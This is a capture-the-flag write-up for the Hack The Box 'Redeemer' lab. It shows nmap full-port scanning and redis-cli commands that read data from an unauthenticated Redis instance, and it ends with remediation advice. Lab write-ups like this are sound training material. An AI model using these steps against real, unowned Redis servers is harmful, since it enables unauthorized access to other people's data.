# Redeemer — HTB Starting Point

**Difficulty:** Very Easy
**OS:** Linux
**Path:** Starting Point — Tier 0

## Summary

Redeemer focuses on Redis misconfiguration, specifically an unauthenticated instance exposed to the network. Connecting with the standard `redis-cli` client and no credentials granted full read access to the database, where the flag was stored directly as a key value.

## Recon

Initial default scan (top 1000 ports) came back empty:

```
nmap -sC -sV -T4 <TARGET_IP>
```

**Results:** All 1000 scanned ports closed. Confirmed host was up via `ping` first, ruling out a dead target.

Re-ran with a full port sweep:

```
nmap -sC -sV -T4 <TARGET_IP> -p-
```

**Results:**

```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Redis was running on a non-standard-for-default-scan port range, top-1000 missed it since 6379 falls outside nmap's default set in some configurations. Good reminder to always run a full `-p-` scan when the default comes back empty rather than assuming the host has nothing open.

## Enumeration

Connected to the Redis service directly with `redis-cli`, targeting the remote host explicitly (default connects to localhost):

```
redis-cli -h <TARGET_IP>
```

Connection succeeded with no authentication required, confirming an unauthenticated Redis instance exposed to the network, a common and high-impact misconfiguration.

Checked server info to confirm version and context:

```
info
```

Confirmed Redis 5.0.7 on Linux, standalone mode, no auth in place.

## Exploitation

Since Redis has no concept of "files" or shells like FTP/SMB, the flag was stored as a key inside the database itself. Selected the default database and listed keys:

```
select 0
keys *
```

**Results:**

```
1) "flag"
2) "temp"
3) "stor"
4) "numb"
```

Retrieved the value of the `flag` key directly:

```
GET flag
```

**Root cause:** Redis instance configured with no authentication (`requirepass` unset) and exposed to external network access, allowing any connecting client full read/write access to the database.

## Privilege Escalation

Not required, flag was directly accessible as a database value via unauthenticated Redis access.

## Flag

```
GET flag
```

Flag captured (redacted for this writeup).

## Lessons Learned

- Always run a full port scan (`-p-`) if a default/top-1000 scan comes back with nothing open, don't assume the host is inactive or fully filtered.
- Redis has no built-in authentication by default in older configurations, an open Redis port is worth checking for unauthenticated access immediately, similar to anonymous FTP or null SMB sessions.
- Unlike file-based services, data on Redis lives in keys rather than a filesystem, `keys *` is the equivalent of `ls` here, and `GET <key>` is the equivalent of reading a file.
- Redis in real-world deployments is often bound to `127.0.0.1` for internal use only, this box represents what happens when that binding is misconfigured to listen externally.

## Remediation (real-world)

- Set `requirepass` in the Redis configuration to require authentication for all connections.
- Bind Redis to `127.0.0.1` or an internal-only interface unless external access is explicitly required.
- If external access is required, restrict it via firewall rules/security groups and use TLS plus strong authentication (Redis 6+ ACLs).
- Avoid storing sensitive data in Redis without encryption at the application layer, even with auth enabled.
